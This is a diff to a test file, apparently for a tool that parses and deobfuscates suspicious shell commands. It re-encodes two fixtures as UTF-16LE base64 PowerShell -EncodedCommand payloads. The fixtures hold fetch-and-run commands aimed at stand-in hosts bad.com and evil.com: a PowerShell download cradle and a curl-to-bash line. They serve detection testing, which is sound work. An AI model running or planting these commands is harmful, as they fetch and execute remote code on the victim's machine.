@@ -53,8 +53,8 @@ TESTS = [
     # ── powershell encoded command ────────────────────────────────────────────
     {
         "id": "powershell_encoded",
-        # payload is base64("IEX(New-Object Net.WebClient).DownloadString('http://bad.com')")
-        "command": "powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==",
+        # payload is base64(utf16le("IEX(New-Object Net.WebClient).DownloadString('http://bad.com')"))
+        "command": "powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AYwBvAG0AJwApAA==",
         "expect": {
             "executable": "powershell.exe",
             "platform": "windows",
@@ -124,10 +124,10 @@ TESTS = [
         },
     },
     # ── deobfuscation: bare base64 blob ───────────────────────────────────────
-    # base64("curl http://evil.com/shell.sh | bash")
+    # payload is base64(utf16le("curl http://evil.com/shell.sh | bash"))
     {
         "id": "deobfuscate_base64",
-        "command": "powershell -EncodedCommand Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo",
+        "command": "powershell -EncodedCommand YwB1AHIAbAAgAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcwBoACAAfAAgAGIAYQBzAGgA",
         "expect": {
             "urls": ["http://evil.com/shell.sh"],
             "domains": ["evil.com"],
